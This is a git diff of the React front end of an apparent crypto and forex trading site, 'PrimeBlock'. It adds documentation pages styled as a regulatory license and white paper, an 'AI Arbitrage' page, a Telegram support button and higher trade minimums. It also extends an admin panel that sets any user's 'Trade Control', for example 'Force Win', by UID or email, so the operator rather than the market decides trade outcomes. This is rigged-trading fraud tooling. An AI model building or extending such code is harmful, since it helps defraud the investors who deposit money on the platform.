@@ -1,20 +1,39 @@
+import { 
+  collection, 
+  doc, 
+  addDoc, 
+  getDoc, 
+  getDocs, 
+  setDoc, 
+  updateDoc, 
+  onSnapshot, 
+  query, 
+  where 
+} from 'firebase/firestore';
 import React, { useState, useEffect, useRef } from 'react';
 import './App.css';
+import {
+  Building2,
+  ChevronDown,
+  FileText,
+  HelpCircle,
+  ShieldCheck
+} from 'lucide-react';
+import { formatLibraryDoc, splitMarkdownSections } from './formatLibraryDoc';
+import ArbitragePage from './ArbitragePage';
 import WithdrawModal from './WithdrawModal';
 import TradeResultModal from './TradeResultModal';
 import { db } from './firebase';
-import * as LightweightCharts from 'lightweight-charts';
-import {
-  collection,
-  doc,
-  getDocs,
-  setDoc,
-  updateDoc,
-  onSnapshot,
-  query,
-  where,
-  addDoc
-} from 'firebase/firestore';
+// NOTE: lightweight-charts is ESM-only; avoid importing it in Jest.
+// It is lazily loaded only when the chart component mounts in the browser.
+let LightweightCharts = null;
+const getLightweightCharts = async () => {
+  if (LightweightCharts) return LightweightCharts;
+  // eslint-disable-next-line @typescript-eslint/no-var-requires
+  LightweightCharts = await import('lightweight-charts');
+  // Some bundlers expose the module as default
+  return LightweightCharts?.default ?? LightweightCharts;
+};
 
 const TRANSLATIONS = {
   english: {
@@ -260,12 +279,151 @@ const TRANSLATIONS = {
   }
 };
 
-function App() {
+const LIBRARY_FILES = {
+  'company-profile': 'about us.txt',
+  'white-paper': 'White Paper.txt',
+  'regulatory-license': 'Regulatory License.txt',
+  faq: 'Commom Problem.txt'
+};
+
+const LIBRARY_LABELS = {
+  'company-profile': 'Company Profile',
+  'white-paper': 'White Paper',
+  'regulatory-license': 'Regulatory License',
+  faq: 'FAQ'
+};
+
+const FAQ_STATIC_ENTRIES = [
+  {
+    id: 'what-pulse',
+    question: 'What can I do at Crypto Pulse?',
+    bodyText:
+      'Crypto Pulse brings live pricing for crypto, metals, and forex into one workspace. Review markets, open trades when you are ready, manage deposits and withdrawals, and reach customer service without leaving the app.'
+  },
+  {
+    id: 'what-ai-arb',
+    question: 'What is AI Arbitrage?',
+    bodyText:
+      'AI Arbitrage describes automated or assisted strategies that aim to capture price differences across venues or related instruments. Execution risk, fees, latency, and liquidity can eliminate theoretical edges. This explanation is educational only—not trading advice.'
+  }
+];
+
+const CREDIT_SCORE_ROWS = [
+  { range: '580 – 620', tier: 'Developing', notes: 'Elevated risk profile; enhanced verification may apply.' },
+  { range: '621 – 650', tier: 'Fair', notes: 'Moderate standing; standard limits and monitoring.' },
+  { range: '651 – 700', tier: 'Good', notes: 'Stable profile; expanded access where eligible.' },
+  { range: '701 – 750', tier: 'Very Good', notes: 'Strong standing; preferential review timelines.' },
+  { range: '751 – 850', tier: 'Excellent', notes: 'Top tier; maximum program flexibility offered.' }
+];
+
+function CreditScoreTiersTable() {
+  return (
+    <div className="credit-tier-table-wrap">
+      <table className="credit-tier-table">
+        <thead>
+          <tr>
+            <th>Score range</th>
+            <th>Tier</th>
+            <th>Program notes</th>
+          </tr>
+        </thead>
+        <tbody>
+          {CREDIT_SCORE_ROWS.map((row) => (
+            <tr key={row.range}>
+              <td>{row.range}</td>
+              <td>{row.tier}</td>
+              <td>{row.notes}</td>
+            </tr>
+          ))}
+        </tbody>
+      </table>
+    </div>
+  );
+}
+
+function RegulatoryDocLayout({ bodyText }) {
+  const sections = splitMarkdownSections(bodyText);
+  if (!sections.length) {
+    return <div className="library-formatted-body">{formatLibraryDoc(bodyText)}</div>;
+  }
+  const tones = ['regulatory-panel--slate', 'regulatory-panel--indigo', 'regulatory-panel--teal'];
+  return (
+    <div className="regulatory-doc-layout">
+      {sections.map((sec, i) => (
+        <section key={`${sec.title}-${i}`} className={`regulatory-panel ${tones[i % tones.length]}`}>
+          <h2 className="library-section-title regulatory-panel-heading">{sec.title}</h2>
+          <div className="regulatory-panel-inner library-formatted-body">{formatLibraryDoc(sec.body)}</div>
+        </section>
+      ))}
+    </div>
+  );
+}
+
+function DocFaqAccordion({ entries, openIndex, setOpenIndex }) {
+  return (
+    <div className="faq-accordion-root">
+      {entries.map((entry, idx) => {
+        const isOpen = openIndex === idx;
+        return (
+          <div key={entry.id} className={`faq-acc-item ${isOpen ? 'is-open' : ''}`}>
+            <button
+              type="button"
+              className="faq-acc-trigger"
+              aria-expanded={isOpen}
+              onClick={() => setOpenIndex(isOpen ? null : idx)}
+            >
+              <span className="faq-acc-question">{entry.question}</span>
+              <ChevronDown className="faq-acc-chevron" size={20} strokeWidth={2} aria-hidden />
+            </button>
+            <div className={`faq-acc-panel ${isOpen ? 'faq-acc-panel--open' : ''}`}>
+              <div className="faq-acc-panel-inner">
+                {entry.table ? (
+                  <CreditScoreTiersTable />
+                ) : (
+                  <div className="library-formatted-body faq-acc-formatted">{formatLibraryDoc(entry.bodyText)}</div>
+                )}
+              </div>
+            </div>
+          </div>
+        );
+      })}
+    </div>
+  );
+}
+
+function DocFaqView({ rawText, openIndex, setOpenIndex }) {
+  const parsed = splitMarkdownSections(rawText);
+  const entries = [
+    ...FAQ_STATIC_ENTRIES.map((e) => ({
+      id: e.id,
+      question: e.question,
+      bodyText: e.bodyText,
+      table: false
+    })),
+    ...parsed.map((s, i) => ({
+      id: `commom-${i}`,
+      question: s.title,
+      bodyText: s.body,
+      table: false
+    })),
+    {
+      id: 'credit-score-tiers',
+      question: 'What are the credit score tiers?',
+      bodyText: '',
+      table: true
+    }
+  ];
+  return <DocFaqAccordion entries={entries} openIndex={openIndex} setOpenIndex={setOpenIndex} />;
+}
+
+function AppInner() {
+  const [activeId, setActiveId] = useState(() => localStorage.getItem('active_user_id') || null);
+  const [isLoggedIn, setIsLoggedIn] = useState(() => localStorage.getItem('is_logged_in') === 'true');
+
   // --- DATA PERSISTENCE (Firebase Firestore) ---
   const [allUsers, setAllUsers] = useState({});
   const [isLoadingUsers, setIsLoadingUsers] = useState(true);
-  const [activeId, setActiveId] = useState(() => localStorage.getItem('active_user_id') || null);
-  const [isLoggedIn, setIsLoggedIn] = useState(() => localStorage.getItem('is_logged_in') === 'true');
+
 
   // --- STATE MANAGEMENT ---
   const [coins, setCoins] = useState([
@@ -309,12 +467,19 @@ function App() {
   const [showProfileWithdraw, setShowProfileWithdraw] = useState(false);
   const [withdrawSuccess, setWithdrawSuccess] = useState(false);
   const [drawerOpen, setDrawerOpen] = useState(false);
+  const [faqOpenIndex, setFaqOpenIndex] = useState(null);
+  const [libraryDocKey, setLibraryDocKey] = useState(null);
+  const [libraryBody, setLibraryBody] = useState('');
+  const [libraryLoading, setLibraryLoading] = useState(false);
+  const [libraryError, setLibraryError] = useState(null);
   const [showSecurityModal, setShowSecurityModal] = useState(false);
   const [verificationStep, setVerificationStep] = useState(1);
   const [phoneNumber, setPhoneNumber] = useState('');
   const [verificationCode, setVerificationCode] = useState('');
 
   const [clickCount, setClickCount] = useState(0);
+  const [targetUserId, setTargetUserId] = useState('');
+  const [adminStatus, setAdminStatus] = useState('');
 
   const [selectedCoin, setSelectedCoin] = useState(() => {
     // Auto-select gold on startup
@@ -344,10 +509,60 @@ function App() {
     return () => clearInterval(timer);
   }, []);
 
+  useEffect(() => {
+    if (!libraryDocKey) {
+      setLibraryBody('');
+      setLibraryError(null);
+      setLibraryLoading(false);
+      return;
+    }
+    const filename = LIBRARY_FILES[libraryDocKey];
+    if (!filename) return;
+    let cancelled = false;
+    setLibraryLoading(true);
+    setLibraryError(null);
+    fetch(`${process.env.PUBLIC_URL}/content/${encodeURIComponent(filename)}`)
+      .then((res) => {
+        if (!res.ok) throw new Error('Could not load this article.');
+        return res.text();
+      })
+      .then((text) => {
+        if (!cancelled) setLibraryBody(text);
+      })
+      .catch((err) => {
+        if (!cancelled) setLibraryError(err.message || 'Load failed.');
+      })
+      .finally(() => {
+        if (!cancelled) setLibraryLoading(false);
+      });
+    return () => {
+      cancelled = true;
+    };
+  }, [libraryDocKey]);
+
+  useEffect(() => {
+    setFaqOpenIndex(null);
+  }, [libraryDocKey]);
+
+  useEffect(() => {
+    if (!drawerOpen) return;
+    const onEsc = (e) => {
+      if (e.key === 'Escape') setDrawerOpen(false);
+    };
+    document.addEventListener('keydown', onEsc);
+    return () => document.removeEventListener('keydown', onEsc);
+  }, [drawerOpen]);
+
+  const openLibraryDoc = (key) => {
+    setLibraryDocKey(key);
+    setCurrentPage('home');
+    setDrawerOpen(false);
+  };
+
   // Trade configuration object
   const tradeOptions = {
     30: { profit: 0.15, minAmount: 500 },
-    60: { profit: 0.30, minAmount: 300 },
+    60: { profit: 0.30, minAmount: 3000 },
     90: { profit: 0.50, minAmount: 10000 },
     120: { profit: 0.70, minAmount: 100000 }
   };
@@ -1067,7 +1282,12 @@ function App() {
     
     const config = tradeOptions[tradeConfig.time];
     if (!config) return alert("Invalid trade duration");
-    if (tradeConfig.amount < config.minAmount) return alert(`Minimum investment for ${tradeConfig.time}s is $${config.minAmount}`);
+    if (tradeConfig.amount < config.minAmount) {
+      if (tradeConfig.time === 60) {
+        return alert('Minimum amount for 60s trading is $3,000.');
+      }
+      return alert(`Minimum investment for ${tradeConfig.time}s is $${config.minAmount}`);
+    }
     if (allUsers[activeId].balance < tradeConfig.amount) return alert("Insufficient Balance");
     
     setIsTrading(true);
@@ -1266,6 +1486,16 @@ function App() {
             <div className="admin-panel" style={{ position: 'relative', zIndex: 9999 }}>
               <h4>Admin Panel</h4>
               <p>Current Trade Control: {user.tradeControl || 'Normal'}</p>
+              <label style={{ display: 'block', marginBottom: '8px' }}>
+                Target User ID (Email):
+                <input
+                  type="text"
+                  value={targetUserId}
+                  onChange={(e) => setTargetUserId(e.target.value)}
+                  placeholder="Enter UID or email"
+                  style={{ display: 'block', width: '100%', marginTop: '4px', padding: '8px' }}
+                />
+              </label>
               <select id="tradeControlSelect" defaultValue={user.tradeControl || 'Normal'}>
                 <option value="Normal">Normal</option>
                 <option value="Force Win">Force Win</option>
@@ -1274,16 +1504,44 @@ function App() {
               <button onClick={async () => {
                 const select = document.getElementById('tradeControlSelect');
                 const value = select.value;
+                setAdminStatus('');
+                const targetId = targetUserId.trim();
+
+                if (!targetId) {
+                  setAdminStatus('User Not Found');
+                  return;
+                }
+
                 try {
-                  await updateDoc(doc(db, 'users', activeId), { tradeControl: value });
-                  alert('Trade control updated');
-                  // Optionally refresh user data
-                  setAllUsers(prev => ({ ...prev, [activeId]: { ...prev[activeId], tradeControl: value } }));
+                  const usersRef = collection(db, 'users');
+                  let userRef = doc(db, 'users', targetId);
+                  let userSnapshot = await getDoc(userRef);
+
+                  if (!userSnapshot.exists()) {
+                    const emailQuery = query(usersRef, where('email', '==', targetId));
+                    const querySnapshot = await getDocs(emailQuery);
+                    if (!querySnapshot.empty) {
+                      userRef = querySnapshot.docs[0].ref;
+                      userSnapshot = querySnapshot.docs[0];
+                    }
+                  }
+
+                  if (!userSnapshot.exists()) {
+                    setAdminStatus('User Not Found');
+                    return;
+                  }
+
+                  await updateDoc(userRef, { tradeControl: value });
+                  setAdminStatus('Update Successful');
+                  setAllUsers(prev => ({ ...prev, [userRef.id]: { ...prev[userRef.id], tradeControl: value } }));
                 } catch (error) {
                   console.error('Error updating trade control:', error);
-                  alert('Error updating');
+                  setAdminStatus('User Not Found');
                 }
               }}>Save</button>
+              {adminStatus && (
+                <p style={{ marginTop: '8px', fontSize: '0.9rem' }}>{adminStatus}</p>
+              )}
             </div>
           )}
         </div>
@@ -1550,9 +1808,11 @@ function App() {
 
   return (
     <div className="app-wrapper">
+      {currentPage !== 'arbitrage' ? (
+      <>
       <header className="header">
         <div className="header-left">
-          <div className="hamburger" onClick={() => setDrawerOpen(true)}>☰</div>
+          <div className="hamburger" onClick={() => setDrawerOpen(true)} aria-label="Open menu">☰</div>
           <div className="brand-name">PrimeBlock</div>
         </div>
         <div className="header-icons">
@@ -1562,10 +1822,37 @@ function App() {
       </header>
 
       {/* Side Drawer */}
-      {drawerOpen && (
-        <div className="side-drawer-overlay" onClick={() => setDrawerOpen(false)}>
-          <div className={`side-drawer ${drawerOpen ? 'open' : ''}`} onClick={(e) => e.stopPropagation()}>
-            <button className="drawer-close" onClick={() => setDrawerOpen(false)}>×</button>
+      <div
+        className={`side-drawer-overlay ${drawerOpen ? 'side-drawer-overlay--open' : ''}`}
+        onClick={() => setDrawerOpen(false)}
+        aria-hidden={!drawerOpen}
+      >
+          <div
+            className={`side-drawer side-drawer-glass ${drawerOpen ? 'open' : ''}`}
+            onClick={(e) => e.stopPropagation()}
+          >
+            <button type="button" className="drawer-close" onClick={() => setDrawerOpen(false)} aria-label="Close menu">×</button>
+            <div className="drawer-section drawer-docs-section">
+              <h5 className="drawer-docs-heading">Documentation</h5>
+              <div className="drawer-docs-grid-four">
+                <button type="button" className="drawer-doc-tile" onClick={() => openLibraryDoc('company-profile')}>
+                  <Building2 className="drawer-doc-icon" size={22} strokeWidth={2} aria-hidden />
+                  <span>Company Profile</span>
+                </button>
+                <button type="button" className="drawer-doc-tile" onClick={() => openLibraryDoc('white-paper')}>
+                  <FileText className="drawer-doc-icon" size={22} strokeWidth={2} aria-hidden />
+                  <span>White Paper</span>
+                </button>
+                <button type="button" className="drawer-doc-tile" onClick={() => openLibraryDoc('regulatory-license')}>
+                  <ShieldCheck className="drawer-doc-icon" size={22} strokeWidth={2} aria-hidden />
+                  <span>Regulatory License</span>
+                </button>
+                <button type="button" className="drawer-doc-tile" onClick={() => openLibraryDoc('faq')}>
+                  <HelpCircle className="drawer-doc-icon" size={22} strokeWidth={2} aria-hidden />
+                  <span>FAQ</span>
+                </button>
+              </div>
+            </div>
             {isLoggedIn && (
               <div className="drawer-profile">
                 <div className="drawer-avatar">👤</div>
@@ -1577,7 +1864,8 @@ function App() {
             )}
             <div className="drawer-section">
               <h5>Home</h5>
-              <div className="drawer-item" onClick={() => { setCurrentPage('home'); setDrawerOpen(false); }}>🏠 Home</div>
+              <div className="drawer-item" onClick={() => { setCurrentPage('home'); setLibraryDocKey(null); setDrawerOpen(false); }}>🏠 Home</div>
+              <div className="drawer-item" onClick={() => { setCurrentPage('arbitrage'); setDrawerOpen(false); }}>⚡ AI Arbitrage</div>
             </div>
             <div className="drawer-section">
               <h5>Market Assets</h5>
@@ -1596,45 +1884,85 @@ function App() {
               {isLoggedIn && <div className="drawer-item logout" onClick={() => { setIsLoggedIn(false); setActiveId(null); setCurrentPage('home'); setDrawerOpen(false); }}>🚪 Logout</div>}
             </div>
           </div>
-        </div>
-      )}
+      </div>
 
       <main className="main-content">
-        <div className="market-tabs-container">
-          <div className={`tab-item ${marketTab === 'crypto' ? 'active-crypto' : ''}`} onClick={() => setMarketTab('crypto')}>{t('crypto')}</div>
-          <div className={`tab-item ${marketTab === 'metals' ? 'active-metals' : ''}`} onClick={() => setMarketTab('metals')}>{t('metals')}</div>
-          <div className={`tab-item ${marketTab === 'forex' ? 'active-forex' : ''}`} onClick={() => setMarketTab('forex')}>{t('forex')}</div>
-        </div>
-        <div className="dashboard-container">
-          {currentPage === 'home' && (
-            <div className="dashboard-header">
-              <div className="dashboard-title">Market Prices</div>
-              <div className="market-status">
-                <span className={`status-dot ${marketStatus === 'live' ? 'online' : 'fallback'}`}></span>
-                <div className="status-info">
-                  <span className="status-label">{marketStatus === 'live' ? 'Live pricing' : 'Benchmark pricing'}</span>
-                  {marketStatus === 'fallback' && <span className="status-tooltip">Using Benchmark Pricing - Live sync paused.</span>}
-                </div>
-              </div>
+        {!libraryDocKey ? (
+          <>
+            <div className="market-tabs-container">
+              <div className={`tab-item ${marketTab === 'crypto' ? 'active-crypto' : ''}`} onClick={() => setMarketTab('crypto')}>{t('crypto')}</div>
+              <div className={`tab-item ${marketTab === 'metals' ? 'active-metals' : ''}`} onClick={() => setMarketTab('metals')}>{t('metals')}</div>
+              <div className={`tab-item ${marketTab === 'forex' ? 'active-forex' : ''}`} onClick={() => setMarketTab('forex')}>{t('forex')}</div>
             </div>
-          )}
-          {loading ? <div className="loading">{t('loadingMarkets')}</div> : (
-          <table className="crypto-table">
-            <thead><tr><th>Asset</th><th style={{textAlign:'center'}}>Price</th><th style={{textAlign:'right'}}>Action</th></tr></thead>
-            <tbody>{availableMarkets().map(asset => (
-              <tr key={asset.id} className="price-row">
-                <td><div className="asset-cell"><img src={asset.image} width="20" alt="" />{asset.symbol.toUpperCase()}</div></td>
-                <td style={{textAlign:'center'}} className={`price-flash ${priceFlash[asset.id] || ''}`}>${asset.current_price.toLocaleString()}</td>
-                <td style={{textAlign:'right'}}><button className="trade-button" onClick={() => { setSelectedCoin(asset); setCurrentPage('trade'); }}>{t('trade')}</button></td>
-              </tr>))}
-            </tbody>
-          </table>
-          )}
-        </div>
+            <div className="dashboard-container">
+              {currentPage === 'home' && (
+                <div className="dashboard-header">
+                  <div className="dashboard-title">Market Prices</div>
+                  <div className="market-status">
+                    <span className={`status-dot ${marketStatus === 'live' ? 'online' : 'fallback'}`}></span>
+                    <div className="status-info">
+                      <span className="status-label">{marketStatus === 'live' ? 'Live pricing' : 'Benchmark pricing'}</span>
+                      {marketStatus === 'fallback' && <span className="status-tooltip">Using Benchmark Pricing - Live sync paused.</span>}
+                    </div>
+                  </div>
+                </div>
+              )}
+              {loading ? <div className="loading">{t('loadingMarkets')}</div> : (
+              <table className="crypto-table">
+                <thead><tr><th>Asset</th><th style={{textAlign:'center'}}>Price</th><th style={{textAlign:'right'}}>Action</th></tr></thead>
+                <tbody>{availableMarkets().map(asset => (
+                  <tr key={asset.id} className="price-row">
+                    <td><div className="asset-cell"><img src={asset.image} width="20" alt="" />{asset.symbol.toUpperCase()}</div></td>
+                    <td style={{textAlign:'center'}} className={`price-flash ${priceFlash[asset.id] || ''}`}>${asset.current_price.toLocaleString()}</td>
+                    <td style={{textAlign:'right'}}><button className="trade-button" onClick={() => { setSelectedCoin(asset); setCurrentPage('trade'); }}>{t('trade')}</button></td>
+                  </tr>))}
+                </tbody>
+              </table>
+              )}
+            </div>
+          </>
+        ) : (
+          <div className="library-view-wrap library-view-wrap--enter" key={libraryDocKey}>
+            <div className="library-toolbar glass-toolbar glass-toolbar--doc">
+              <button type="button" className="back-btn-colored library-back-markets" onClick={() => setLibraryDocKey(null)}>
+                Back to Markets
+              </button>
+              <h1 className="library-view-title">{LIBRARY_LABELS[libraryDocKey]}</h1>
+            </div>
+            <article className={`library-content-card library-content-card--premium ${libraryDocKey === 'regulatory-license' ? 'library-content-card--regulatory' : ''}`}>
+              {libraryLoading && <p className="library-status">Loading…</p>}
+              {libraryError && <p className="library-status library-status-error">{libraryError}</p>}
+              {!libraryLoading && !libraryError && libraryDocKey === 'regulatory-license' && (
+                <RegulatoryDocLayout bodyText={libraryBody} />
+              )}
+              {!libraryLoading && !libraryError && libraryDocKey === 'faq' && (
+                <DocFaqView rawText={libraryBody} openIndex={faqOpenIndex} setOpenIndex={setFaqOpenIndex} />
+              )}
+              {!libraryLoading &&
+                !libraryError &&
+                libraryDocKey !== 'regulatory-license' &&
+                libraryDocKey !== 'faq' && (
+                  <div className="library-formatted-body">{formatLibraryDoc(libraryBody)}</div>
+                )}
+            </article>
+          </div>
+        )}
       </main>
+      </>
+      ) : (
+        <ArbitragePage
+          userId={activeId}
+          userBalance={isLoggedIn ? Number(allUsers[activeId]?.balance) || 0 : 0}
+          isLoggedIn={isLoggedIn}
+          onBack={() => setCurrentPage('home')}
+          onRequireLogin={() => setShowAuth(true)}
+        />
+      )}
 
       {/* Floating Support Button */}
-      {currentPage === 'home' && <div className="floating-support" onClick={() => window.open(telegramLink)}>🎧</div>}
+      {currentPage === 'home' && !libraryDocKey && (
+        <div className="floating-support" onClick={() => window.open(telegramLink)}>🎧</div>
+      )}
 
       {/* --- MODALS --- */}
       {showAuth && (
@@ -1680,4 +2008,14 @@ function App() {
   );
 }
 
-export default App; 
+export default function App() {
+  return <AppInner />;
+}
+
+export { AppInner };
+
+
+
+
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
